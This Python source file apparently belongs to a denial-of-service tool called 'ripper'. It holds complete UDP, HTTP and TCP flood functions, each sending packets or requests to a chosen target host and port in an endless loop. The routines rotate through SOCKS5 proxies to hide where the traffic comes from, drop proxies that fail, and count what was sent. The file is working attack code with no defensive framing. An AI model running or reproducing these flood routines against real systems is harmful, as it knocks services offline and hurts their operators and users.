import socket
import random
import threading
from os import urandom as randbytes
from socks import ProxyError

import ripper.services
from ripper.constants import *
from ripper.context import Context, Errors, ErrorCodes
from ripper.common import get_random_string
from ripper.proxy import Sock5Proxy
from ripper.urllib_x import build_request_http_package, http_request

lock = threading.Lock()

###############################################
# Common methods for attacks
###############################################
# TODO add support for http_method, http_path
def build_ctx_request_http_package(_ctx: Context, is_accept_header_only: bool = True) -> str:
    local_headers = _ctx.headers
    if is_accept_header_only:
        local_headers = {
            'Accept': _ctx.headers['Accept']
        }

    extra_data = ''
    if _ctx.max_random_packet_len > 0:
        extra_data = get_random_string(1, _ctx.max_random_packet_len)

    return build_request_http_package(
        host=_ctx.host,
        headers=local_headers,
        extra_data=extra_data,
    )


def random_proxy_from_context(_ctx: Context) -> Sock5Proxy:
    if not _ctx.proxy_list or not len(_ctx.proxy_list):
        return None
    return random.choice(_ctx.proxy_list)


def delete_proxy(_ctx: Context, proxy: Sock5Proxy):
    lock.acquire()
    is_exists = proxy in _ctx.proxy_list
    if is_exists:
        _ctx.proxy_list.remove(proxy)
    lock.release()
    return is_exists


###############################################
# Attack methods
###############################################
def down_it_udp(_ctx: Context) -> None:
    """UDP flood method."""
    i = 1
    proxy = None
    while True:
        if proxy is None:
            proxy = random_proxy_from_context(_ctx)
            if proxy and not proxy.validate():
                delete_proxy(_ctx, proxy)
                proxy = None
                continue

        sock = _ctx.sock_manager.get_udp_socket(proxy)
        request_packet = build_ctx_request_http_package(_ctx)

        try:
            sock.sendto(request_packet, (_ctx.host_ip, _ctx.port))
        except socket.gaierror:
            _ctx.add_error(Errors(ErrorCodes.CannotGetServerIP.value, GETTING_SERVER_IP_ERROR_MSG))
        except Exception as e:
            _ctx.add_error(Errors(ErrorCodes.UnhandledError.value, e))
            _ctx.sock_manager.close_udp_socket(proxy)
        # successful try (sock.sendto)
        else:
            _ctx.Statistic.packets.total_sent += 1
            _ctx.Statistic.packets.sync_packets_sent()
            _ctx.Statistic.packets.total_sent_bytes += len(request_packet)
            _ctx.remove_error(ErrorCodes.CannotGetServerIP.value)
            proxy.report_success() if proxy is not None else 0

        i += 1
        if i == 100:
            i = 1
            if not _ctx.Statistic.connect.in_progress:
                threading.Thread(
                    daemon=True,
                    target=ripper.services.connect_host,
                    args=[_ctx, proxy],
                ).start()
                # ripper.services.connect_host(_ctx,)


def down_it_http(_ctx: Context) -> None:
    """HTTP flood method."""
    proxy = None
    while True:
        proxy = random_proxy_from_context(_ctx)
        try:
            response = http_request(
                url=_ctx.get_target_url(),
                proxy=proxy,
                http_method=_ctx.http_method,
                socket_timeout=_ctx.sock_manager.socket_timeout,
            )
        except ProxyError:
            delete_proxy(_ctx, proxy)
        except:
            _ctx.add_error(Errors(ErrorCodes.CannotSendRequest.value, CANNOT_SEND_REQUEST_ERR_MSG))
            _ctx.Statistic.connect.failed += 1
        # successful try (http_request)
        else:
            _ctx.Statistic.http_stats[response.status] += 1
            _ctx.Statistic.connect.success += 1
            proxy.report_success() if proxy is not None else 0

        _ctx.Statistic.packets.total_sent += 1


def down_it_tcp(_ctx: Context) -> None:
    """TCP flood method."""
    proxy = None
    while True:
        try:
            proxy = random_proxy_from_context(_ctx)
            sock = _ctx.sock_manager.create_tcp_socket(proxy)
            sock.connect((_ctx.host_ip, _ctx.port))
            _ctx.Statistic.connect.success += 1
            while True:
                bytes_to_send = randbytes(_ctx.max_random_packet_len)
                try:
                    sock.send(bytes_to_send)
                except ProxyError:
                    delete_proxy(_ctx, proxy)
                    _ctx.Statistic.connect.failed += 1
                    sock.close()
                    break
                # successful try (sock.send)
                except:
                    _ctx.add_error(Errors(ErrorCodes.CannotSendRequest.value, CANNOT_SEND_REQUEST_ERR_MSG))
                    _ctx.Statistic.connect.failed += 1
                    sock.close()
                    break
                else:
                    _ctx.Statistic.packets.total_sent_bytes += _ctx.max_random_packet_len
                    _ctx.Statistic.packets.total_sent += 1
                    proxy.report_success() if proxy is not None else 0
        except ProxyError:
            delete_proxy(_ctx, proxy)
        except Exception as e:
            _ctx.add_error(Errors(ErrorCodes.UnhandledError.value, e))
            _ctx.Statistic.connect.failed += 1
